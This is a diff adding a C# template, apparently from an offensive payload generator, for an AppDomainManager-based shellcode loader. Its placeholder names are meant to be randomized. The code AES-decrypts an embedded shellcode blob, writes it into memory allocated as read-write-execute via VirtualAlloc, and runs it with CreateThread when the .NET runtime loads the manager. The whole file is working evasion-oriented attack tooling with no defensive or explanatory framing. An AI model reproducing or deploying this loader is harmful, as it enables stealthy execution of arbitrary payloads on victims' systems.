@@ -1,0 +1,150 @@
+using System;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Threading.Tasks;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+
+
+public sealed class {{ managerType }} :  AppDomainManager
+{
+
+    public {{ managerType }}()
+    {
+        var t = Task.Run(() =>
+            {{class_Helper}}.{{func_Run}}()
+        );
+        t.Wait();
+        return;
+    }
+
+    internal static class {{class_NativeMethods}}
+    {
+        [Flags]
+        public enum AllocationType
+        {
+            Commit = 0x1000,
+            Reserve = 0x2000,
+            Decommit = 0x4000,
+            Release = 0x8000,
+            Reset = 0x80000,
+            Physical = 0x400000,
+            TopDown = 0x100000,
+            WriteWatch = 0x200000,
+            LargePages = 0x20000000
+        }
+
+        [Flags]
+        public enum MemoryProtection
+        {
+            Execute = 0x10,
+            ExecuteRead = 0x20,
+            ExecuteReadWrite = 0x40,
+            ExecuteWriteCopy = 0x80,
+            NoAccess = 0x01,
+            ReadOnly = 0x02,
+            ReadWrite = 0x04,
+            WriteCopy = 0x08,
+            GuardModifierflag = 0x100,
+            NoCacheModifierflag = 0x200,
+            WriteCombineModifierflag = 0x400
+        }
+
+        [DllImport("kernel32")]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    }
+
+    internal static class {{class_Helper}}
+    {
+        public static void {{func_Run}}()
+        {
+
+            MethodInfo mi = typeof({{class_Helper}}).GetMethod("{{pump_func}}", BindingFlags.Static | BindingFlags.Public);
+            IntPtr addr = GetMethodAddress(mi);
+
+            byte[] {{var_codeBytes}} = {{class_StringEncryption}}.{{func_Decrypt}}("{{encShellcode}}");
+
+            uint {{var_codeSize}} = (uint){{var_codeBytes}}.Length;
+            IntPtr {{var_codePtr}} = {{class_NativeMethods}}.VirtualAlloc(IntPtr.Zero, {{var_codeSize}}, 0x3000, 0x40);
+
+            Marshal.Copy({{var_codeBytes}}, 0, {{var_codePtr}}, (int){{var_codeSize}});
+
+            IntPtr {{var_threadHandle}} = {{class_NativeMethods}}.CreateThread(IntPtr.Zero, 0, {{var_codePtr}}, IntPtr.Zero, 0, IntPtr.Zero);
+
+            //{{class_NativeMethods}}.WaitForSingleObject((IntPtr)({{var_threadHandle}}), 0xFFFFFFFF);
+        }
+
+        public static void {{pump_func}}()
+        {
+            {{&pump_func_body}}
+        }
+    }
+
+    
+    public static IntPtr GetMethodAddress(MethodInfo method)
+    {
+        RuntimeMethodHandle handle = method.MethodHandle;
+        RuntimeHelpers.PrepareMethod(handle);
+        return handle.GetFunctionPointer();
+    }
+
+    public static class {{class_StringEncryption}}
+    {
+        private static string {{var_ivstring}} = "{{ivstring}}";
+
+        private static byte[] {{var_ivarray}} = Encoding.UTF8.GetBytes({{var_ivstring}});
+        
+        private static string {{var_keystring}} = "{{key}}";
+
+        private static byte[] {{var_encryptionKey}} = {{func_GetKeyFromString}}({{var_keystring}});
+        
+        private static CipherMode cipherMode = CipherMode.CBC;
+
+        private static PaddingMode paddingMode = PaddingMode.Zeros;
+
+        public static byte[] {{func_Decrypt}}(string {{var_encryptedText}})
+        {
+            byte[] {{var_encryptedBytes}} = Convert.FromBase64String({{var_encryptedText}});
+            return {{func_DecryptBytes}}({{var_encryptedBytes}});
+        }
+
+        private static byte[] {{func_DecryptBytes}}(byte[] {{var_encryptedBytes}})
+        {
+            using (AesManaged aes = new AesManaged())
+            {
+                aes.Mode = cipherMode;
+                aes.Padding = paddingMode;
+                aes.Key = {{var_encryptionKey}};
+                aes.IV = {{var_ivarray}};
+                ICryptoTransform {{var_decryptor}} = aes.CreateDecryptor(aes.Key, aes.IV);
+                using (MemoryStream {{var_memoryStream}} = new MemoryStream({{var_encryptedBytes}}))
+                {
+                    using (CryptoStream {{var_cryptoStream}} = new CryptoStream({{var_memoryStream}}, {{var_decryptor}}, CryptoStreamMode.Read))
+                    {
+                        byte[] {{var_decryptedBytes}} = new byte[{{var_encryptedBytes}}.Length];
+                        int {{var_bytesRead}} = {{var_cryptoStream}}.Read({{var_decryptedBytes}}, 0, {{var_decryptedBytes}}.Length);
+                        return {{var_decryptedBytes}};
+                    }
+                }
+            }
+        }
+
+        private static byte[] {{func_GetKeyFromString}}(string {{var_input}})
+        {
+            using (SHA256 sha256Hash = SHA256.Create())
+            {
+                byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes({{var_input}}));
+                return bytes;
+            }
+        }
+    }
+}
